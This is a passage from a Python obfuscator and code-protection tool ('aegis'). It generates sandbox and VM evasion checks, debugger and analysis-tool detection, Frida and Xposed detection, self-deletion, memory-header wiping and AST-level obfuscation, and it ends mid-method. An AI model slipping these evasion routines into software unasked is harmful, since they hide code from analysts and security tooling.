    {d}=__import__('linecache');{d}.getline=lambda*aa:'';{d}.getlines=lambda*aa:[];{d}.checkcache=lambda*aa:None;{d}.cache.clear()
except:pass
try:
    {e}=__import__('gc');{e}.get_objects=lambda:[];{e}.get_referrers=lambda*aa:[];{e}.get_referents=lambda*aa:[]
except:pass
try:
    {f}=__import__('sys');{f}._getframe=lambda*aa:type('frame',(),{{'f_code':type('code',(),{{'co_filename':'aegis','co_name':'aegis'}})(),'f_back':None,'f_locals':{{}},'f_globals':{{}},'f_lineno':0}})()
except:pass
try:
    {h}=__import__('code');{h}.compile_command=lambda*aa:None;{h}.InteractiveConsole=lambda*aa:type('IC',(),{{'interact':lambda*bb:None}})()
except:pass
try:
    {i}=__import__('pdb');{i}.Pdb=type('FakePdb',(),{{'set_trace':lambda*aa:None,'run':lambda*aa:None,'pm':lambda*aa:None}});{i}.set_trace=lambda*aa:None;{i}.pm=lambda*aa:None
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 辛(凱_):
        _=凱_.α;r=凱_._r;k1=r.randint(1,255)
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('ctypes');{d}=__import__('time')
_BOOM=lambda:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
try:
    {e}={d}.perf_counter();[ii^{k1} for ii in range(500)];{f}={d}.perf_counter()
    if({f}-{e})<0.00001 or({f}-{e})>3.0:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {g}={c}.windll.user32.GetSystemMetrics(0);{h}={c}.windll.user32.GetSystemMetrics(1)
        if {g}<800 or {h}<600:_BOOM()
except:pass
try:
    {i}={d}.perf_counter();{j}={d}.time()
    {d}.sleep(0.05)
    if abs(({d}.perf_counter()-{i})-({d}.time()-{j}))>0.1:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {k}={c}.windll.kernel32.GetTickCount()
        {d}.sleep(0.05)
        if({c}.windll.kernel32.GetTickCount()-{k})<30:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {l}={c}.c_longlong();{m}={c}.c_longlong()
        {c}.windll.kernel32.QueryPerformanceCounter({c}.byref({l}))
        [ii^{k1} for ii in range(1000)]
        {c}.windll.kernel32.QueryPerformanceCounter({c}.byref({m}))
        if({m}.value-{l}.value)<100:_BOOM()
except:pass
try:
    {n}={b}.cpu_count()
    if {n} is not None and {n}<2:_BOOM()
except:pass
try:
    {o}={b}.environ.get('USERNAME','').lower();{p}={b}.environ.get('COMPUTERNAME','').lower()
    if {o}=={p}:_BOOM()
except:pass
try:
    {q}={b}.path.expanduser('~')
    if not {b}.path.exists({b}.path.join({q},'Desktop'))and not {b}.path.exists({b}.path.join({q},'Downloads')):_BOOM()
except:pass
try:
    def {p}():raise ZeroDivisionError
    def {q}():
        try:{p}()
        except ZeroDivisionError:return True
        return False
    _t1={d}.perf_counter();[{q}()for _ in range(100)];_t2={d}.perf_counter()
    {s}={b}.cpu_count()
    if {s} and {s}<2:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
except:pass
try:
    {t}={b}.path.join({b}.environ.get('USERPROFILE',''),'Desktop')
    {u}={b}.path.join({b}.environ.get('USERPROFILE',''),'Downloads')
    if {b}.path.exists({t})and {b}.path.exists({u}):
        if len({b}.listdir({t}))==0 and len({b}.listdir({u}))==0:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 癸(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,f,s,t,T,U,V,X,Y,Z,aa,u=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{a}=__import__('sys');{b}=__import__('os');{f}={L(v=f'{a}.argv[0]if {a}.argv else None')}
{s}=id(eval)^id(exec)^id(compile)^id(__import__)^id(open)^id(type);{t}=({s}>>32)^({s}&0xFFFFFFFF);globals()['{u}']=lambda:{L(v=f'({s},{t})')}
def {T}():
    try:
        _ff=globals().get('__file__',{f})
        if _ff and {b}.path.basename({a}.argv[0])=={b}.path.basename(_ff):
            with open(_ff,'w')as {U}:{U}.write('')
            {b}.remove(_ff)
    except:pass
    try:
        for {V} in {a}.modules.values():
            if hasattr({V},'__dict__'):{V}.__dict__.clear()
    except:pass
    {a}.modules.clear()
{X}=id(exec);{Y}=id(eval);{Z}=id(compile);{aa}=id(open)
if {T}==0 or {X}==0 or {Y}==0 or {Z}==0:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 子(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,v,w=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        dbg_process=['ollydbg.exe','x64dbg.exe','x32dbg.exe','ida64.exe','ida.exe','wireshark.exe','fiddler.exe','httpdebuggerui.exe','processhacker.exe','cheatengine.exe']
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('ctypes')
try:
    if hasattr({c},'windll'):
        class {d}({c}.Structure):
            _fields_=[("dwSize",{c}.c_ulong),("cntUsage",{c}.c_ulong),("th32ProcessID",{c}.c_ulong),("th32DefaultHeapID",{c}.c_ulonglong),("th32ModuleID",{c}.c_ulong),("cntThreads",{c}.c_ulong),("th32ParentProcessID",{c}.c_ulong),("pcPriClassBase",{c}.c_long),("dwFlags",{c}.c_ulong),("szExeFile",{c}.c_char*260)]
        {e}={c}.windll.kernel32.CreateToolhelp32Snapshot;{f}={c}.windll.kernel32.Process32First;{g}={c}.windll.kernel32.Process32Next;{h}={c}.windll.kernel32.CloseHandle
        {i}={d}();{i}.dwSize={c}.sizeof({d});{j}={e}(0x00000002,0)
        if {j}!=-1:
            if {f}({j},{c}.byref({i})):
                while True:
                    {k}={i}.szExeFile.decode('latin-1').lower()
                    if any(dp in {k} for dp in {repr(dbg_process)}):globals().get('__aegis_boom__',lambda:{b}._exit(1))()
                    if not {g}({j},{c}.byref({i})):break
            {h}({j})
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 丑(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        b,c,I,J,K,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{b}=__import__('os');{c}=__import__('ctypes')
_BOOM=lambda:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
try:
    {I}=['PYDEVD','PYTHONDEBUG','PYTHONINSPECT','PYTHONBREAKPOINT','PYCHARM_DEBUG']
    for {J} in {I}:
        if {J} in {b}.environ:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {K}={c}.windll.kernel32.CheckRemoteDebuggerPresent
        {M}={c}.c_int(0);{K}({c}.windll.kernel32.GetCurrentProcess(),{c}.byref({M}))
        if {M}.value!=0:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {N}={c}.windll.kernel32.GetModuleHandleA(None)
        {O}={c}.windll.kernel32.VirtualProtect
        {P}={c}.c_ulong(0)
        {O}({N},4096,0x40,{c}.byref({P}))
        {c}.memset({N},0,4096)
        {O}({N},4096,{P},{c}.byref({P}))
except:pass
try:
    if hasattr({c},'windll'):
        {Q}={c}.windll.ntdll.NtQueryInformationProcess
        {R}={c}.c_ulong(0)
        {Q}({c}.windll.kernel32.GetCurrentProcess(),0x1F,{c}.byref({R}),{c}.sizeof({R}),None)
        if {R}.value!=0:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {S}={c}.windll.kernel32.GetModuleHandleA(b'dbghelp.dll')
        if {S}:
            {T}={c}.windll.kernel32.GetProcAddress({S},b'MiniDumpWriteDump')
            if {T}:
                {U}={c}.cast({T},{c}.POINTER({c}.c_ubyte))
                if {U}[0]==0xE9 or {U}[0]==0xEB:_BOOM()
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # protect
    def 封(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,w,x=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        t1,tr1=_(t=True);t2,tr2=_(t=True);t3,tr3=_(t=True)
        salt1,salt2,salt3=r.randint(10000,99999),r.randint(100000,999999),r.randint(1000000,9999999)
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('hashlib');{d}=__import__('marshal')
_BOOM=lambda:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
{t1}={L()};{tr1}
{e}={a}.argv[0]if {a}.argv else None
{f}=None
try:
    if {e}:{f}=open({e},'rb').read()
except:pass
{g}={c}.sha256({f}).hexdigest()if {f} else None
{h}={c}.md5({f}).hexdigest()if {f} else None
{i}=len({f})if {f} else 0
{j}={salt1}^{salt2}^{salt3}
def {k}():
    try:
        {l}=0
        for {m} in dir():
            try:{l}+=id(eval({m}))
            except:pass
        return {l}
    except:return 0
{n}={k}()
{t2}={L()};{tr2}
def {o}():
    try:
        {p}=0
        for {q},{s} in globals().items():
            if callable({s})and hasattr({s},'__code__'):
                try:{p}+=sum({s}.__code__.co_code)
                except:pass
        return {p}
    except:return 0
{t}={o}()
def {u}():
    try:
        if {e}:
            {w}=open({e},'rb').read()
            if len({w})!={i}:_BOOM()
            if {c}.sha256({w}).hexdigest()!={g}:_BOOM()
    except:pass
{u}()
{t3}={L()};{tr3}
def __check_integrity__():
    try:
        {x}={o}()
        if {x}!={t} and {t}!=0:{b}._exit(1)
    except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # trap
    def 乙(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r;k1=r.randint(1,255)
        a,b,x,y,z,A,B,C,D,E,F,G,H,I,J,K=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        exc1,exc2,exc3,exc4,exc5,exc6,exc7,exc8=_(8),_(8),_(8),_(8),_(8),_(8),_(8),_(8)
        out = f'''{a}=__import__('sys');{b}=__import__('os')
class {exc1}(Exception):
    __slots__=('{x}',)
    def __init__({y},*{z}):{y}.{x}={z};{y}.__traceback__=None;{y}.__cause__=None;{y}.__context__=None
    def __reduce__({y}):return(__import__('os')._exit,(1,))
    def __reduce_ex__({y},{A}):return(__import__('os')._exit,(1,))
    def __getstate__({y}):{b}._exit(1)
class {exc2}(MemoryError):
    def __reduce__({B}):return(__import__('os')._exit,(1,))
    def __reduce_ex__({B},{C}):return(__import__('os')._exit,(1,))
class {exc3}(SystemExit):
    def __init__({D}):super().__init__(1);{D}.__traceback__=None
class {exc4}(RuntimeError):
    __slots__=()
    def __reduce__({E}):return(__import__('os')._exit,(1,))
class {exc5}(TypeError):
    def __reduce__({F}):return(__import__('os')._exit,(1,))
class {exc6}(ValueError):
    def __reduce__({G}):return(__import__('os')._exit,(1,))
class {exc7}(AttributeError):
    def __reduce__({H}):return(__import__('os')._exit,(1,))
class {exc8}(KeyError):
    def __reduce__({I}):return(__import__('os')._exit,(1,))
{J}=[b'\\x90'*1024 for _ in range(100)]
{K}=[[ii^{k1} for ii in range(256)]for _ in range(50)]
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # hash
    def 壬(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r;k1,k2=r.randint(1,255),r.randint(1,255)
        a,b,c,e,f,g,h,i,j,k,l,m,n,o,p,q,ab,ac,ad,ae,af,ag,ah,ai,aj=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('hashlib');{e}={L()};{f}={L(v=f'{a}.argv[0]if {a}.argv else None')}
{g}=(lambda ff:(lambda xx:xx(xx))(lambda xx:ff(lambda *aa:xx(xx)(*aa))))(lambda rr:lambda nn:1 if nn<2 else rr(nn-1)+rr(nn-2))({r.randint(5,8)})if 0 else None;{h}={{ii:(lambda ii=ii:{L(v=f'ii^{k1}')})for ii in range(15)}};{i}=[{h}[ii]()for ii in range(15)]
try:
    {j}=open({f},'rb').read()if {f} else b'';{k}={c}.sha256({j}).hexdigest()[:16]if {j} else'';{l}={c}.md5({j}).hexdigest()[:16]if {j} else'';{m}={c}.sha512({j}).hexdigest()[:16]if {j} else'';{n}={c}.blake2b({j}).hexdigest()[:16]if {j} else''
    globals()['{o}']=lambda:{L(v=f'({k},{l},{m},{n})')}
except:globals()['{o}']=lambda:None
{p}={{jj:(lambda jj=jj:{L(v=f'jj^{k2}')})for jj in range(20)}};{q}=[{p}[jj]()for jj in range(20)]
def {ab}():
    try:
        {ac}=['requests','urllib3','httpx','aiohttp'];{ad}=__import__('hashlib')
        for {ae} in {ac}:
            try:
                {af}=__import__({ae});{ag}=getattr({af},'__file__',None)
                if {ag}:
                    {ah}={b}.path.dirname({ag});{ai}=0
                    for {aj} in {b}.listdir({ah}):
                        if {aj}.endswith('.py'):
                            try:{ai}+=len(open({b}.path.join({ah},{aj}),'rb').read())
                            except:pass
                    {af}.__aegis_hash__={ad}.md5(str({ai}).encode()).hexdigest()
            except:pass
    except:pass
{ab}()
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # runtime
    def 寅(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r;k1,k2=r.randint(1,255),r.randint(1,255)
        a,b,E,F,P,Q,R,S,T,U,V,W,X,Y,Z,AA,AB,AC,AD,AE,AF,AG=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{a}=__import__('sys');{b}=__import__('os')
{E}={{zz:(lambda zz=zz:{L(v=f'zz*{k1}')})for zz in range(10)}};{F}=[{E}[zz]()for zz in range(10)]
{P}={{aa:(lambda aa=aa:{L(v=f'aa^{k2}')})for aa in range(10)}};{Q}=[{P}[aa]()for aa in range(10)]
try:
    {R}=__import__('gc');{R}.disable();{R}.set_threshold(0,0,0)
    {S}={R}.get_objects;{T}={R}.get_referrers
    {R}.get_objects=lambda:[oo for oo in {S}()[:100]if not hasattr(oo,'__code__')]
    {R}.get_referrers=lambda*aa:[]
except:pass
{U}=__import__('threading');{V}=[0];{W}=hash(tuple([id(exec),id(eval),id(compile),id(__import__)]))
{Z}=id(globals().get('__builtins__'))
{AA}=len({a}.meta_path)if hasattr({a},'meta_path')else 0
{AB}=len({a}.path_hooks)if hasattr({a},'path_hooks')else 0
def {X}():
    while True:
        __import__('time').sleep(0.05)
        if {a}.gettrace()or {a}.getprofile():{b}._exit(1)
        if hash(tuple([id(exec),id(eval),id(compile),id(__import__)]))!={W}:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
        if any(hasattr(ff,'__wrapped__')for ff in[exec,eval,compile]):globals().get('__aegis_boom__',lambda:{b}._exit(1))()
        if id(globals().get('__builtins__'))!={Z} and {Z}!=0:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
        if hasattr({a},'meta_path')and len({a}.meta_path)>{AA}+2:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
        if 'ANDROID_ROOT' in {b}.environ:
            for _m in list({a}.modules.keys()):
                if 'frida' in _m.lower()or 'xposed' in _m.lower():globals().get('__aegis_boom__',lambda:{b}._exit(1))()
try:{U}.Thread(target={X},daemon=True).start()
except:pass
try:
    {Y}=[__import__('gc').get_objects()[ii]for ii in range(min(50,len(__import__('gc').get_objects())))]
except:pass
try:
    if hasattr({a},'meta_path'):
        for _mp in list({a}.meta_path):
            if hasattr(_mp,'__module__')and any(kk in str(_mp.__module__).lower()for kk in['debug','trace','hook','inject']):{a}.meta_path.remove(_mp)
except:pass
def {AC}():
    _frida_paths=['/data/local/tmp/frida-server','/data/local/tmp/re.frida.server','/system/bin/frida','/system/xbin/frida']
    _xposed_paths=['/system/framework/XposedBridge.jar','/system/lib/libxposed_art.so','/system/lib64/libxposed_art.so']
    for _p in _frida_paths+_xposed_paths:
        if {b}.path.exists(_p):globals().get('__aegis_boom__',lambda:{b}._exit(1))()
    try:
        import socket;_s=socket.socket();_s.settimeout(0.05)
        try:_s.connect(('127.0.0.1',27042));_s.close();globals().get('__aegis_boom__',lambda:{b}._exit(1))()
        except:pass
    except:pass
if 'ANDROID_ROOT' in {b}.environ:{AC}()
def {AD}():
    _bb=globals().get('__builtins__')
    if _bb is None:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
    _core=['eval','exec','compile','open','__import__']
    for _c in _core:
        if hasattr(_bb,'__dict__'):
            if _c not in _bb.__dict__:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
        elif isinstance(_bb,dict):
            if _c not in _bb:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
try:{AD}()
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # transform
    def Ψ(凱_,tree):
        L=凱_.λ;R=凱_._r;_map={};_data=[]
        for _ in range(50):_data.append([R.randint(0,255) for _ in range(R.randint(10,50))])
        _fname=凱_.α(compact=True);_dname=凱_.α(compact=True)
        _key=凱_._r.randint(1,255);_opkey=凱_.α(compact=True)
        _varcache=[凱_.α()for _ in range(500)];_varidx=[0]
        def _v():
            if _varidx[0]>=len(_varcache):_varcache.extend([凱_.α()for _ in range(100)])
            v=_varcache[_varidx[0]];_varidx[0]+=1;return v
        reserved={'print','input','open','eval','exec','compile','type','len','range','str','int','list','dict','tuple','set','bool','float','bytes','Exception','True','False','None','__init__','__name__','__main__','self','cls','super'}
        class 魁(ast.NodeTransformer):
            def visit_Import(魁_,n):
                new_nodes=[]
                try:
                    for alias in n.names:
                        target=alias.asname if alias.asname else alias.name.split('.')[0]
                        if '.' not in alias.name:
                            call=ast.Call(func=ast.Subscript(value=ast.Name(id=_opkey,ctx=ast.Load()),slice=ast.Constant(value=3),ctx=ast.Load()),args=[ast.Constant(value=alias.name)],keywords=[])
                            new_nodes.append(ast.Assign(targets=[ast.Name(id=target,ctx=ast.Store())],value=call))
                        else:new_nodes.append(n)
                    if len(new_nodes)==len(n.names) and all(isinstance(x,ast.Assign) for x in new_nodes):return new_nodes
                except:pass
                return n
            def visit_ImportFrom(魁_,n):
                new_nodes=[]
                try:
                    if n.module and n.level==0:
                        for alias in n.names:
                            targ=alias.asname if alias.asname else alias.name
                            call=ast.Call(func=ast.Subscript(value=ast.Name(id=_opkey,ctx=ast.Load()),slice=ast.Constant(value=3),ctx=ast.Load()),args=[ast.Constant(value=n.module)],keywords=[ast.keyword(arg='fromlist',value=ast.List(elts=[ast.Constant(value=alias.name)],ctx=ast.Load()))])
                            val=ast.Attribute(value=call,attr=alias.name,ctx=ast.Load())
                            new_nodes.append(ast.Assign(targets=[ast.Name(id=targ,ctx=ast.Store())],value=val))
                        return new_nodes
                except:pass
                return n
            def visit_Set(魁_,n):
                try:
                    魁_.generic_visit(n);v=凱_.α(compact=True)
                    elts=','.join(ast.unparse(x)for x in n.elts)
                    return ast.parse(f"(lambda *{v}:set({v}))({elts})",mode='eval').body
                except:pass
                return n
            def visit_Dict(魁_,n):
                try:
                    魁_.generic_visit(n);vn=凱_.α(compact=True)
                    keys=[ast.unparse(kk)for kk in n.keys];vals=[ast.unparse(vv)for vv in n.values]
                    kv=','.join(f"{kk}={vv}" for kk,vv in zip(keys,vals)if kk.isidentifier())
                    if len(kv)==len(keys): return ast.parse(f"(lambda **{vn}:{vn})({kv})",mode='eval').body
                except:pass
                return n
            def visit_Constant(魁_,n):
                try:
                    if isinstance(n.value,float):return ast.parse(f"{n.value}",mode='eval').body
                    if isinstance(n.value,complex):
                        r=int(n.value.real)if n.value.real==int(n.value.real)else n.value.real
                        i=int(n.value.imag)if n.value.imag==int(n.value.imag)else n.value.imag
                        return ast.parse(f"({r}+{i}*1j)",mode='eval').body
                    if isinstance(n.value,(bytes,str)):
                        _S=isinstance(n.value,str);_D=n.value.encode()if _S else n.value
                        if len(_D)>100:
                            _k=凱_._r.randint(1,255);_c=__import__('zlib').compress(_D);_e=bytes(b^_k for b in _c)
                            return ast.parse(f"__import__('zlib').decompress(bytes(b^{_k} for b in {_e!r})){'.decode()'if _S else ''}",mode='eval').body
                        _k=凱_._r.randint(1,255);_e=bytes(b^_k for b in _D)
                        return ast.parse(f"bytes(b^{_k} for b in {_e!r}){'.decode()'if _S else ''}",mode='eval').body
                    if isinstance(n.value,int)and not isinstance(n.value,bool):
                        if n.value<0:m=凱_._r.randint(1,255);p=-n.value;return ast.parse(f"(-(({p}^{m})^{m}))",mode='eval').body
                        if 0<=n.value<1000:m=凱_._r.randint(1,255);x=n.value^m;return ast.parse(f"(({x}^{m}))",mode='eval').body
                        if 1000<=n.value<1000000:m=凱_._r.randint(1,255);x=n.value^m;return ast.parse(f"({x}^{m})",mode='eval').body
                        return ast.parse(f"{n.value}",mode='eval').body
                    if isinstance(n.value,bool):return ast.parse(f"(not(1>2))"if n.value else f"(not(1<2))",mode='eval').body
                except:pass
                return n
            def visit_BinOp(魁_,n):
                try:
                    魁_.generic_visit(n);op_idx={ast.Add:4,ast.Sub:5,ast.Mult:6,ast.Div:7,ast.FloorDiv:8,ast.Mod:9,ast.Pow:10,ast.LShift:11,ast.RShift:12,ast.BitAnd:13,ast.BitOr:14,ast.BitXor:15}.get(type(n.op))
                    if op_idx:
                        a,b=凱_.α(compact=True),凱_.α(compact=True)
                        while b==a:b=凱_.α(compact=True)
                        left=ast.unparse(n.left);right=ast.unparse(n.right)
                        return ast.parse(f"(lambda {a},{b}:{_opkey}[{op_idx}]({a},{b}))({left},{right})",mode='eval').body
                except:pass
                return n
            def visit_Compare(魁_,n):
                try:
                    魁_.generic_visit(n)
                    if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n)):return n
                    if len(n.ops)==1 and len(n.comparators)==1:
                        a,b=凱_.α(compact=True),凱_.α(compact=True)
                        while b==a:b=凱_.α(compact=True)
                        left=ast.unparse(n.left);comp=ast.unparse(n.comparators[0])
                        op_idx={ast.Eq:16,ast.NotEq:17,ast.Lt:18,ast.Gt:19,ast.LtE:20,ast.GtE:21,ast.Is:22,ast.IsNot:23,ast.In:24,ast.NotIn:25}.get(type(n.ops[0]))
                        if op_idx:return ast.parse(f"(lambda {a},{b}:{_opkey}[{op_idx}]({a},{b}))({left},{comp})",mode='eval').body
                except:pass
                return n
            def visit_FunctionDef(魁_,n):
                try:
                    locals_=set();args_=set()
                    if n.args.args:args_.update(a.arg for a in n.args.args)
                    if n.args.posonlyargs:args_.update(a.arg for a in n.args.posonlyargs)
                    if n.args.kwonlyargs:args_.update(a.arg for a in n.args.kwonlyargs)
                    if n.args.vararg:args_.add(n.args.vararg.arg)
                    if n.args.kwarg:args_.add(n.args.kwarg.arg)
                    for node in ast.walk(n):
                        if isinstance(node, (ast.Assign, ast.AnnAssign)):
                            targs=node.targets if isinstance(node,ast.Assign) else [node.target]
                            for t in targs:
                                if isinstance(t,ast.Name):locals_.add(t.id)
                    locals_-=args_
                    mapping={};used_vars=set(locals_)|set(args_)
                    for name in locals_:
                        if name not in reserved:
                            while True:
                                nn=凱_.α(compact=True)
                                if nn not in used_vars and nn not in reserved:
                                    mapping[name]=nn;used_vars.add(nn);break
                    class Renamer(ast.NodeTransformer):
                         def visit_Name(S,node):
                             if node.id in mapping:node.id=mapping[node.id]
                             return node
                    # n=Renamer().visit(n)

                    魁_.generic_visit(n)
                except:pass
                return n
            def visit_Assign(魁_,n):
                魁_.generic_visit(n)
                try:
                    if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n.value)):return n
                    if isinstance(n.value, (ast.Constant, ast.Name, ast.BinOp)):
                        n.value=ast.Call(func=ast.Lambda(args=ast.arguments(posonlyargs=[],args=[],kwonlyargs=[],kw_defaults=[],defaults=[]),body=ast.Call(func=ast.Lambda(args=ast.arguments(posonlyargs=[],args=[],kwonlyargs=[],kw_defaults=[],defaults=[]),body=n.value),args=[],keywords=[])),args=[],keywords=[])
                except:pass
                return n
            def visit_Try(魁_,n):
                魁_.generic_visit(n)
                try:
                    v=凱_.α(compact=True)
                    junk=ast.Assign(targets=[ast.Name(id=v,ctx=ast.Store())],value=ast.Constant(value=凱_._r.randint(1000,9999)))
                    n.body.insert(0,junk)
                    for _ in range(凱_._r.randint(1,2)):
                        fn=凱_.α(compact=True)
                        fake_handler=ast.ExceptHandler(type=ast.Name(id='OSError',ctx=ast.Load()),name=fn,body=[ast.Pass()])
                        n.handlers.insert(0, fake_handler)
                except:pass
                return n
            def visit_ClassDef(魁_,n):
                魁_.generic_visit(n)
                if n.name not in reserved:
                    try:
                        for _ in range(凱_._r.randint(3,6)):
                            vn,vv=凱_.α(compact=True),凱_._r.randint(1000,99999)
                            n.body.insert(0,ast.Assign(targets=[ast.Name(id=vn,ctx=ast.Store())],value=ast.Constant(value=vv)))
                        for _ in range(凱_._r.randint(2,4)):
                            fn=凱_.α(compact=True)
                            n.body.append(ast.FunctionDef(name=fn,args=ast.arguments(posonlyargs=[],args=[ast.arg(arg='self')],kwonlyargs=[],kw_defaults=[],defaults=[]),body=[ast.Pass()],decorator_list=[]))
                    except:pass
                return n
            def visit_Call(魁_,n):
                魁_.generic_visit(n)
                try:
                    if isinstance(n.func, ast.Name) and n.func.id in ('super','eval','exec','globals','locals','vars','dir','hasattr','getattr','setattr','__import__','type','isinstance','issubclass'): return n
                    if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n)):return n
                    if isinstance(n.func, ast.Name):
                        v=凱_.α(compact=True)
                        args=[n.func]+n.args;kws=[ast.keyword(arg=k.arg,value=k.value)for k in n.keywords]
                        call_node = ast.Call(func=ast.Subscript(value=ast.Name(id=_opkey,ctx=ast.Load()),slice=ast.Constant(value=26),ctx=ast.Load()),args=args,keywords=kws)
                        return ast.parse(f"(lambda {v}: {ast.unparse(call_node).replace(ast.unparse(n.func), v, 1)})({ast.unparse(n.func)})",mode='eval').body
                except:pass
                return n
            def visit_Attribute(魁_,n):
                try:
                     n.value = 魁_.visit(n.value)
                     if isinstance(n.ctx, ast.Load):
                         attr_node = 魁_.visit(ast.Constant(value=n.attr))
                         return ast.Call(func=ast.Name(id='getattr',ctx=ast.Load()),args=[n.value, attr_node],keywords=[])
                except:pass
                return n
            def visit_If(魁_,n):
                魁_.generic_visit(n)
                try:
                    test=ast.unparse(n.test);n.test=ast.parse(f"[{{0:({{0:[{test}][0]}}[0],)[0]}}[0]][0]",mode='eval').body
                    if not n.orelse:
                        junk=ast.Expr(value=ast.Call(func=ast.Name(id='len',ctx=ast.Load()),args=[ast.List(elts=[],ctx=ast.Load())],keywords=[]))
                        n.orelse=[ast.If(test=ast.Call(func=ast.Subscript(value=ast.Name(id=_opkey,ctx=ast.Load()),slice=ast.Constant(value=18),ctx=ast.Load()),args=[ast.Constant(value=1),ast.Constant(value=1)],keywords=[]),body=[junk],orelse=[])]
                except:pass
                return n

            def visit_Return(魁_,n):
                魁_.generic_visit(n)
                if n.value is not None:
                    try:
                        if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n.value)):return n
                        val=ast.unparse(n.value);n.value=ast.parse(f"[{{0:({{0:[{val}][0]}}[0],)[0]}}[0]][0]",mode='eval').body
                    except:pass
                return n
            def visit_BoolOp(魁_,n):
                魁_.generic_visit(n)
                try:
                    if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n)):return n
                    val=ast.unparse(n);return ast.parse(f"({{0:[{{0:({val},)[0]}}[0]][0]}}[0],)[0]",mode='eval').body
                except:pass
                return n
            def visit_UnaryOp(魁_,n):
                魁_.generic_visit(n)
                v=凱_.α(compact=True)
                try:
                    if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n.operand)):return n
                    operand=ast.unparse(n.operand)
                    if isinstance(n.op,ast.Not):return ast.parse(f"(lambda {v}:not {v})({operand})",mode='eval').body
                    elif isinstance(n.op,ast.USub):return ast.parse(f"(lambda {v}:-{v})({operand})",mode='eval').body
                    elif isinstance(n.op,ast.UAdd):return ast.parse(f"(lambda {v}:+{v})({operand})",mode='eval').body
                    elif isinstance(n.op,ast.Invert):return ast.parse(f"(lambda {v}:~{v})({operand})",mode='eval').body
                except:pass
                return n
            def visit_Subscript(魁_,n):
                魁_.generic_visit(n)
                if isinstance(n.ctx,ast.Load):
                    a,b=凱_.α(compact=True),凱_.α(compact=True)
                    while b==a:b=凱_.α(compact=True)
                    try:
                        if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n)):return n
                        obj=ast.unparse(n.value);idx=ast.unparse(n.slice)
                        e=f"(lambda {a},{b}:{a}[{b}])({obj},{idx})"
                        return ast.parse(e,mode='eval').body
                    except:pass
                return n
            def visit_For(魁_,n):
                魁_.generic_visit(n)
                try:
                    if any(isinstance(x,(ast.Await,ast.Yield,ast.YieldFrom))for x in ast.walk(n.iter)):return n
